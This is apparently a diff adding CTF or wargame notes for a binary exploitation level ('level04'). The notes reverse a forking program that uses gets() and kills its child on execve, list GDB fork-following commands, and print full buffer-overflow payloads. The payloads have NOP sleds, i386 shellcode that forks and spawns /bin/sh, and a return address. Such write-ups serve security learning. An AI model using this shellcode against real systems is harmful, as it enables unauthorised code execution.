@@ -1,0 +1,75 @@
+/*******************************/
+/*	  R E V E R S E	       */
+/*******************************/
+
+
+main()
+-> buffer[128]
+-> fork()
+-> set 32 first bytes to '\0'
+-> child:
+	buffer overflow ->
+	A*156
+
+-> SIGHUP is sent while parent end 
+-> intercept syscall of the children and kill an execve immediatly
+
+
+
+
+Simple shell code:
+(python -c 'print "\x90"*(50) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xcc"*(156-78) + "\xc0\xd6\xff\xff"';cat) | ./level04
+
+->needed because parent process kill his child
+-> impossible to change PID
+-> so create a new process
+
+
+
+
+
+
+=> We have a fork and 2 processes
+=> The child call the gets() function so we can overwrite the stack
+
+=> The parant have an infinite loop that check if the child returned terminated correctly or not 
+-> prctl(PR_SET_PDEATHSIG (1), SIGHUP (1));
+ 1 SIGHUP     Terminate   Hang up controlling terminal or      Yes
+                          process 
+=> r < <(python -c 'print "\x90"*(100) + "\xB8\x02\x00\x00\x00\xCD\x80\x31\xC0\xB0\xAC\xBB\x01\x00\x00\x00\x31\xC9\xCD\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xcc"*(156-148) + "\x90\xd6\xff\xff"')
+
+Second protection:
+=> The loop stop if the child used the sys call execve (11 in i386)
+=> It reads this value from the user space of the child at offset 0x2c (44) corresponding to the eax register
+=> Then kill the child process immediately
+
+
+=> So we need to execute a command that allow us to bypass these protections
+
+Useful GDB commands:
+- set follow-fork-mode [child - parent] - set the follow of gdb to the child or the parent
+- show follow-fork-mode - show the current follow  mode
+- set detach-on-fork off - view both processes
+- info inferior - the current process followed by gdb
+- inferior id - see the inferior processe number id (ex: inferior 1) 
+- remove-inferiors id - remove the inferior "id"
+
+=> Let's set the follow to the child and break after the gets()
+   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
+   0x08048763 <+155>:	jmp    0x804881a <main+338>
+-> b *0x08048763
+
+=> Let's try to launch a simple shell code
+
+r < <(python -c 'print "\x90"*(100) + "\xB8\x02\x00\x00\x00\xCD\x80\x31\xC0\xB0\xAC\xBB\x01\x00\x00\x00\x31\xC9\xCD\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xcc"*(156-148) + "\x90\xd6\xff\xff"')
+
+fork: \xB8\x02\x00\x00\x00\xCD\x80 
+shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+
+=> Let's try to fork in the child and execcute a shell code this time 
+
+-> Complete payload:
+(python -c 'print "\x90"*(100) + "\xB8\x02\x00\x00\x00\xCD\x80\x31\xC0\xB0\xAC\xBB\x01\x00\x00\x00\x31\xC9\xCD\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xcc"*(156-148) + "\x90\xd6\xff\xff"';cat) | ./level04
+
+
+
